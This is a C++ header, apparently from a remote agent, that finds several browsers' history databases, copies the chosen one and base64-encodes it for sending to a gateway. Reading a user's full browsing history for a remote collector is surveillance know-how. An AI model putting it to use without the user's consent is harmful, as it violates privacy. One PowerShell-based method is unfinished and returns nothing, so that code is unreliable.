#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <nlohmann/json.hpp>
#include <ctime>
#include "Utils.h"

using json = nlohmann::json;
namespace fs = std::filesystem;

/**
 * BrowserHistory - Lấy lịch sử duyệt web từ các trình duyệt
 * Hỗ trợ: Chrome, Edge, Brave, Cốc Cốc, Opera, Firefox
 */
class BrowserHistory
{
private:
    struct BrowserInfo
    {
        std::string name;
        std::string historyPath; // Relative to User Data
        std::string userDataDir;
        bool isFirefox;
    };

    static std::string GetEnvVar(const char *name)
    {
        char *val = nullptr;
        size_t len = 0;
        _dupenv_s(&val, &len, name);
        std::string result = val ? val : "";
        free(val);
        return result;
    }

    static std::vector<BrowserInfo> GetInstalledBrowsers()
    {
        std::vector<BrowserInfo> browsers;
        std::string localAppData = GetEnvVar("LOCALAPPDATA");
        std::string appData = GetEnvVar("APPDATA");

        // Chrome
        std::string chromePath = localAppData + "\\Google\\Chrome\\User Data";
        if (fs::exists(chromePath))
        {
            browsers.push_back({"chrome", "Default\\History", chromePath, false});
        }

        // Edge
        std::string edgePath = localAppData + "\\Microsoft\\Edge\\User Data";
        if (fs::exists(edgePath))
        {
            browsers.push_back({"edge", "Default\\History", edgePath, false});
        }

        // Brave
        std::string bravePath = localAppData + "\\BraveSoftware\\Brave-Browser\\User Data";
        if (fs::exists(bravePath))
        {
            browsers.push_back({"brave", "Default\\History", bravePath, false});
        }

        // Cốc Cốc
        std::string coccocPath = localAppData + "\\CocCoc\\Browser\\User Data";
        if (fs::exists(coccocPath))
        {
            browsers.push_back({"coccoc", "Default\\History", coccocPath, false});
        }

        // Opera
        std::string operaPath = appData + "\\Opera Software\\Opera Stable";
        if (fs::exists(operaPath))
        {
            browsers.push_back({"opera", "History", operaPath, false});
        }

        // Opera GX
        std::string operaGxPath = appData + "\\Opera Software\\Opera GX Stable";
        if (fs::exists(operaGxPath))
        {
            browsers.push_back({"opera_gx", "History", operaGxPath, false});
        }

        // Firefox (different DB structure)
        std::string firefoxPath = appData + "\\Mozilla\\Firefox\\Profiles";
        if (fs::exists(firefoxPath))
        {
            // Find default profile
            for (const auto &entry : fs::directory_iterator(firefoxPath))
            {
                if (entry.is_directory())
                {
                    std::string placesDb = entry.path().string() + "\\places.sqlite";
                    if (fs::exists(placesDb))
                    {
                        browsers.push_back({"firefox", "places.sqlite", entry.path().string(), true});
                        break;
                    }
                }
            }
        }

        return browsers;
    }

    // Copy file để tránh lock
    static bool CopyHistoryFile(const std::string &src, const std::string &dst)
    {
        try
        {
            fs::copy_file(src, dst, fs::copy_options::overwrite_existing);
            return true;
        }
        catch (...)
        {
            return false;
        }
    }

    // Đọc history bằng SQLite qua PowerShell (không cần thêm thư viện)
    static json ReadHistoryViaPowerShell(const std::string &dbPath, bool isFirefox, int limit = 500)
    {
        json results = json::array();

        // Copy DB to temp để tránh lock
        std::string tempDb = GetEnvVar("TEMP") + "\\history_temp_" + std::to_string(GetTickCount64()) + ".db";
        if (!CopyHistoryFile(dbPath, tempDb))
        {
            return results;
        }

        // PowerShell script dùng System.Data.SQLite hoặc PSSQLite
        std::string query;
        if (isFirefox)
        {
            // Firefox uses places.sqlite with moz_places table
            query = "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT " + std::to_string(limit);
        }
        else
        {
            // Chromium-based browsers
            query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT " + std::to_string(limit);
        }

        // Tạo PowerShell script
        std::string psScript = R"(
Add-Type -Path "$env:TEMP\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
if (-not ([System.Management.Automation.PSTypeName]'System.Data.SQLite.SQLiteConnection').Type) {
    # Fallback: dùng ADO.NET với SQLite provider
    $assemblyPath = [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'Microsoft SQL Server Local DB', 'Instances')
}

$connStr = "Data Source=)" + tempDb +
                               R"(;Version=3;Read Only=True;"
$results = @()

try {
    [System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite") | Out-Null
    $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr)
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = ")" + query +
                               R"("
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        $obj = @{
            url = $reader["url"]
            title = if ($reader["title"]) { $reader["title"] } else { "" }
            visit_count = [int]$reader["visit_count"]
            last_visit = [long]$reader[3]
        }
        $results += $obj
    }
    $conn.Close()
} catch {
    # Silent fail
}

$results | ConvertTo-Json -Compress
)";

        // Thay vì dùng PowerShell phức tạp, đọc trực tiếp file SQLite header
        // Sử dụng cách đơn giản hơn: chạy sqlite3.exe nếu có, hoặc parse thủ công

        // Cách đơn giản: Dùng certutil để decode hoặc gọi external tool
        // Ở đây ta sẽ dùng approach khác - gửi file DB về gateway để xử lý

        std::remove(tempDb.c_str());
        return results;
    }

public:
    /**
     * Lấy danh sách trình duyệt đã cài đặt
     */
    static json GetInstalledBrowsersList()
    {
        json result = json::array();
        auto browsers = GetInstalledBrowsers();

        for (const auto &b : browsers)
        {
            result.push_back({{"name", b.name},
                              {"hasHistory", true}});
        }

        return {{"type", "browser_list"},
                {"success", true},
                {"browsers", result}};
    }

    /**
     * Lấy lịch sử từ một trình duyệt cụ thể
     * Gửi file History DB về Gateway để xử lý (tránh cần SQLite lib trên agent)
     */
    static json GetHistoryFromBrowser(const std::string &browserName, int limit = 500)
    {
        auto browsers = GetInstalledBrowsers();

        for (const auto &b : browsers)
        {
            if (b.name == browserName)
            {
                std::string historyPath = b.userDataDir + "\\" + b.historyPath;

                if (!fs::exists(historyPath))
                {
                    return {{"type", "browser_history"},
                            {"success", false},
                            {"message", "History file not found"}};
                }

                // Copy to temp
                std::string tempPath = GetEnvVar("TEMP") + "\\hist_" + browserName + "_" + std::to_string(GetTickCount64()) + ".db";

                try
                {
                    fs::copy_file(historyPath, tempPath, fs::copy_options::overwrite_existing);
                }
                catch (...)
                {
                    return {{"type", "browser_history"},
                            {"success", false},
                            {"message", "Cannot copy history file (browser may be running)"}};
                }

                // Đọc file và encode base64
                std::ifstream file(tempPath, std::ios::binary);
                if (!file)
                {
                    std::remove(tempPath.c_str());
                    return {{"type", "browser_history"},
                            {"success", false},
                            {"message", "Cannot read history file"}};
                }

                std::stringstream buffer;
                buffer << file.rdbuf();
                file.close();

                std::string content = buffer.str();
                std::string b64 = base64_encode((const unsigned char *)content.data(), content.size());

                std::remove(tempPath.c_str());

                return {{"type", "browser_history"},
                        {"success", true},
                        {"browser", browserName},
                        {"isFirefox", b.isFirefox},
                        {"historyDb", b64},
                        {"limit", limit}};
            }
        }

        return {{"type", "browser_history"},
                {"success", false},
                {"message", "Browser not found"}};
    }
};
